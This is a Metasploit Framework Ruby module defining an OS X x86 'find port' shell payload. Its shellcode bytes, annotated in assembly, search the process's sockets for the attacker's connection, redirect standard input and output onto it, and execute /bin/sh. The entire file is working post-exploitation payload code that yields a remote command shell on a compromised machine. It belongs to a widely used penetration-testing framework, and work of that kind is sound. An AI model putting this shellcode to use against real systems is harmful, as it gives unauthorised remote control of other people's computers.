##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##


require 'msf/core'
require 'msf/core/handler/find_port'
require 'msf/base/sessions/command_shell'

module Msf
module Payloads
module Singles
module Osx
module X86

module ShellFindPort

	include Msf::Payload::Single
	include Msf::Payload::Osx

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'OSX Command Shell, Find Port Inline',
			'Version'       => '$Revision$',
			'Description'   => 'Spawn a shell on an established connection',
			'Author'        => 'Ramon de Carvalho Valle <ramon[at]risesecurity.org>',
			'License'       => MSF_LICENSE,
			'Platform'      => 'osx',
			'Arch'          => ARCH_X86,
			'Handler'       => Msf::Handler::FindPort,
			'Session'       => Msf::Sessions::CommandShell,
			'Payload'       =>
				{
					'Offsets' =>
						{
							'CPORT' => [ 25, 'n' ],
						},
					'Payload' =>
						"\x31\xc0"             +#   xorl    %eax,%eax                  #
						"\x50"                 +#   pushl   %eax                       #
						"\x89\xe7"             +#   movl    %esp,%edi                  #
						"\x6a\x10"             +#   pushl   $0x10                      #
						"\x54"                 +#   pushl   %esp                       #
						"\x57"                 +#   pushl   %edi                       #
						"\x50"                 +#   pushl   %eax                       #
						"\x50"                 +#   pushl   %eax                       #
						"\x58"                 +#   popl    %eax                       #
						"\x58"                 +#   popl    %eax                       #
						"\x40"                 +#   incl    %eax                       #
						"\x50"                 +#   pushl   %eax                       #
						"\x50"                 +#   pushl   %eax                       #
						"\x6a\x1f"             +#   pushl   $0x1f                      #
						"\x58"                 +#   popl    %eax                       #
						"\xcd\x80"             +#   int     $0x80                      #
						"\x66\x81\x7f\x02\x04\xd2"+#   cmpw    $0xd204,0x02(%edi)         #
						"\x75\xee"             +#   jne     <fndsockcode+11>           #
						"\x50"                 +#   pushl   %eax                       #
						"\x6a\x5a"             +#   pushl   $0x5a                      #
						"\x58"                 +#   popl    %eax                       #
						"\xcd\x80"             +#   int     $0x80                      #
						"\xff\x4f\xf0"         +#   decl    -0x10(%edi)                #
						"\x79\xf6"             +#   jns     <fndsockcode+30>           #
						"\x68\x2f\x2f\x73\x68" +#   pushl   $0x68732f2f                #
						"\x68\x2f\x62\x69\x6e" +#   pushl   $0x6e69622f                #
						"\x89\xe3"             +#   movl    %esp,%ebx                  #
						"\x50"                 +#   pushl   %eax                       #
						"\x54"                 +#   pushl   %esp                       #
						"\x54"                 +#   pushl   %esp                       #
						"\x53"                 +#   pushl   %ebx                       #
						"\x50"                 +#   pushl   %eax                       #
						"\xb0\x3b"             +#   movb    $0x3b,%al                  #
						"\xcd\x80"              #   int     $0x80                      #
				}
			))
	end

end

end end end end end
